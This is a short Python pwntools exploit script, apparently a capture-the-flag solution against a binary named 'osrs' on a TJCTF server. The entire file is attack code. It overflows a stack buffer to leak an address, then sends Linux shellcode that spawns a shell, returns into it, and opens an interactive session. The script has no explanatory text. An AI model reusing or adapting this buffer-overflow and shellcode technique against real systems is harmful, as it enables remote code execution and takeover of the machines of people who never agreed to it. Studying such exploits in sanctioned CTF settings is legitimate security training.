from pwn import *

from string import printable

# p = process('./osrs')
p = remote("p1.tjctf.org", 8006)

input("debug")

whole_string = b"".join([bytes(i*4, 'utf-8') for i in printable])

payload = whole_string[:whole_string.index(b"''''")]

p.recvuntil("type:")

p.sendline(payload + p32(0x08048546))

addr = hex(0xffffffff + int(p.recvuntil(":(").split()[-2]) + 1)

p.recvuntil("type:")

padding = whole_string[:whole_string.index(b'!!!!')] + b"!!"

payload = asm(shellcraft.i386.linux.sh()) + padding + p32(int(addr, 16) + 0x4)

p.sendline(payload)



p.interactive()